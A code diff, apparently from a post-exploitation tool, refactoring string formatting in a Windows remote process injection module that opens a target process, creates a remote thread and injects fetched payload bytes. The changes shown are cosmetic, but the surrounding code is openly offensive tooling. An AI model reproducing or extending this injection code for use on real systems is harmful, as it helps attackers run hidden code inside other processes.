@@ -98,8 +98,7 @@ def inject_task(process_handle, payload_bytes):
         return 0, "CreateRemoteThread failed: " + str(res_thread.get("error"))
 
     print(
-        "[+] Remote thread created (Handle: 0x%x, Thread ID: %d)"
-        % (thread_handle, thread_id)
+        sprintf("[+] Remote thread created (Handle: 0x%x, Thread ID: %d)", thread_handle, thread_id)
     )
     return thread_handle, None
 
@@ -117,10 +116,8 @@ def inject_remote(process_id, payload_bytes):
     proc_res = win_call("kernel32.dll", "OpenProcess", access, 0, process_id)
     process_handle = proc_res["r1"]
     if process_handle == 0:
-        return "OpenProcess (PID %d) failed: %s" % (
-            process_id,
-            str(proc_res.get("error")),
-        )
+        return sprintf("OpenProcess (PID %d) failed: %s", process_id,
+            str(proc_res.get("error")))
 
     thread_handle, err = inject_task(process_handle, payload_bytes)
     if thread_handle != 0:
@@ -153,13 +150,12 @@ def main(*args):
         return "Fail: fetch_file failed for " + payload_file
 
     print(
-        "[*] Injecting %d bytes of payload into PID %d with the existing token..."
-        % (len(payload_bytes), pid)
+        sprintf("[*] Injecting %d bytes of payload into PID %d with the existing token...", len(payload_bytes), pid)
     )
     err = inject_remote(pid, payload_bytes)
     if err != None:
-        print("[-] Injection failed: %s" % err)
+        print(sprintf("[-] Injection failed: %s", err))
         return "Fail: " + err
 
-    print("[+] Injected successfully into PID %d" % pid)
+    print(sprintf("[+] Injected successfully into PID %d", pid))
     return "OK"
